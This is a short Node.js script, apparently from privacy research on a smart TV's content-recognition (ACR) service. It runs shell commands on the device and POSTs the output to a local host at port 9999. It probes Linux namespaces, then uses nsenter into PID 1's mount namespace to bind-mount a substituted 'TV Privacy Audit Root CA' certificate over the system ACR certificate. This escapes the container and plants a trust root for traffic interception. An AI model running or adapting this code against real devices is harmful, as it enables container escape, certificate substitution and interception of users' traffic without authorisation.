"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 3500); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.ns = sh("readlink /proc/self/ns/mnt; readlink /proc/1/ns/mnt; readlink /proc/self/ns/pid; readlink /proc/1/ns/pid");
out.nsenter = sh("which nsenter; nsenter --help 2>&1 | head -3");
out.combined_check = sh("md5sum /opt/acr-ca/ca.pem 2>&1; grep -c 'TV Privacy Audit Root CA' /opt/acr-ca/ca.pem 2>&1; tail -2 /opt/acr-ca/ca.pem 2>&1");
out.labels = sh("ls -laZ /opt/etc/ /opt/etc/resolv.conf 2>&1 | head -8");
out.try_nsenter = sh("nsenter -t 1 -m -- mount --bind /opt/acr-ca/ca.pem /usr/lib/acr/cert/ca.pem && echo NSENTER_BIND_OK; nsenter -t 1 -m -- grep -c 'TV Privacy Audit Root CA' /usr/lib/acr/cert/ca.pem");
post("/acr_ns", out);
